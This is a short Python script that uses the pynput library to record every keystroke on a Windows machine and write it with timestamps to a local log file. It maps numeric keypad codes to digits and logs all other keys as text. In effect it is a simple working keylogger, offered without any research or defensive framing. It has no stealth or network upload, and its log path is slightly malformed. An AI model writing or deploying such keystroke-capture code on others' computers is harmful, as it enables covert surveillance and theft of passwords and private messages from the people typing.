from pynput.keyboard import Key, Listener
import logging

# Log directory, change this as per your preference
log_dir = 'C:/Users/HP\logs/ '

# Configuring logging with log directory, logging level and format
logging.basicConfig(filename=(log_dir + "logs.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    # Check if the key pressed is a digit (0-9)
    if hasattr(key, 'vk') and 96 <= key.vk <= 105:
        if key.vk == 96:
            # Log 0
            logging.info("0")
        elif key.vk == 97:
            # Log 1
            logging.info("1")
        elif key.vk == 98:
            # Log 2
            logging.info("2")
        elif key.vk == 99:
            # Log 3
            logging.info("3")
        elif key.vk == 100:
            # Log 4
            logging.info("4")
        elif key.vk == 101:
            # Log 5
            logging.info("5")
        elif key.vk == 102:
            # Log 6
            logging.info("6")
        elif key.vk == 103:
            # Log 7
            logging.info("7")
        elif key.vk == 104:
            # Log 8
            logging.info("8")
        elif key.vk == 105:
            # Log 9
            logging.info("9")
    else:
        # Log the key as a string
        logging.info(str(key))

# Start the listener with the on_press function defined
with Listener(on_press=on_press) as listener:
    listener.join()
